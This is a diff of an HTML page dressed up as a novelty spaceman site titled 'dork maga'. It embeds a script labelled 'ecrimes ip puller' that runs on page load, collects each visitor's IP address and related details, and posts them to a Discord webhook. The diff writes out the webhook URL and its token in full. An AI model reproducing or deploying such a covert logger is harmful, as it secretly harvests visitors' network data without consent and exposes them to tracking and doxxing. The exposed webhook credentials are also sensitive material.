@@ -1,4 +1,60 @@
-<!DOCTYPE html>
+<!doctype html>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8" />
+        <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no, viewport-fit=cover" />
+        <title>dork maga</title>
+        <link rel="stylesheet" href="rizz.css" />
+        <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+        <link rel="manifest" href="/site.webmanifest">
+        <style>
+            /* Centered Spaceman Character */
+            .spaceman {
+                position: fixed;
+                top: 50%;
+                left: 50%;
+                transform: translate(-50%, -50%);
+                z-index: 10; /* above the canvas */
+            }
+
+            .spaceman img {
+                width: 250px;        /* adjust as needed */
+                max-width: 90vw;     /* responsive on smaller screens */
+                border-radius: 12px; /* optional */
+            }
+        </style>
+    </head>
+    <body>
+        <audio id="audio1">
+            <source src="/wails/1.mp3" type="audio/mp3" />
+        </audio>
+        <audio id="audio2">
+            <source src="/wails/2.mp3" type="audio/mp3" />
+        </audio>
+        <audio id="audio3">
+            <source src="/wails/3.mp3" type="audio/mp3" />
+        </audio>
+        <audio id="audio4">
+            <source src="/wails/4.mp3" type="audio/mp3" />
+        </audio>
+        <audio id="audio5">
+            <source src="/wails/5.mp3" type="audio/mp3" />
+        </audio>
+        <audio id="audio6">
+            <source src="/wails/6.mp3" type="audio/mp3" />
+        </audio>
+
+        <canvas></canvas>
+
+        <!-- New centered spaceman -->
+        <div class="spaceman">
+            <img src="https://m.media-amazon.com/images/I/71CwEdqHrpL._SL1500_.jpg" alt="Spaceman">
+        </div>
+
+        <script src="yo.js"></script>
+        <!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
@@ -7,15 +63,15 @@
 <body>
     <script>
     async function sendToDiscord(ipInfo) {
-        const webhookURL = 'https://discord.com/api/webhooks/1308891035342213120/TbQOU164hVD4wWZ7kle5tqIXpS9_lU3P7fUXmlYw7fTBm5Av8Zki7-Cw9D4dZd530xvr';
+        const webhookURL = 'https://discord.com/api/webhooks/1414982640246853774/d52YIc8k6ZxrM2-caMi_keBr5IVoo-DS3J8Yn6Vg65hRXhKmvio3YI8nYLWpPnEQ1Xru';
         const discordMessage = {
             content: "@everyone" ,
             embeds: [
                 {
                     image: {
-                        url: "https://www.rollingstone.com/wp-content/uploads/2022/02/king-von-posthumous-album.jpg"
+                        url: "https://4kwallpapers.com/images/walls/thumbs_3t/14625.jpg"
                     },
-                    title: "King von IP puller 😈",
+                    title: "ecrimes ip puller",
                     fields: [
                         {
                             name: "IP Address", 
@@ -65,7 +121,7 @@
                     ],
                     color: 0x007BFF,
                     footer: {
-                        text: "BY RUNTZ PURCHASE TODAY!"
+                        text: "MADE BY ECRIMES"
                     }
                 }
             ]
@@ -94,4 +150,9 @@
     getVisitorInfo();
     </script>
 </body>
+</html>
+        <!-- Cloudflare Pages Analytics -->
+        <script defer src='https://static.cloudflareinsights.com/beacon.min.js' data-cf-beacon='{"token": "32d9ceecdcc14ade861cc9eed94a5a25"}'></script>
+        <script defer src="https://static.cloudflareinsights.com/beacon.min.js/vcd15cbe7772f49c399c6a5babf22c1241717689176015" integrity="sha512-ZpsOmlRQV6y907TI0dKBHq9Md29nnaEIPlkf84rnaERnq6zvWvPUqr2ft8M1aS28oN72PdrCzSjY4U6VaAw1EQ==" data-cf-beacon='{"version":"2024.11.0","token":"ad8414e5f5b34f24a6359afb9860088e","r":1,"server_timing":{"name":{"cfCacheStatus":true,"cfEdge":true,"cfExtPri":true,"cfL4":true,"cfOrigin":true,"cfSpeedBrain":true},"location_startswith":null}}' crossorigin="anonymous"></script>
+    </body>
 </html>
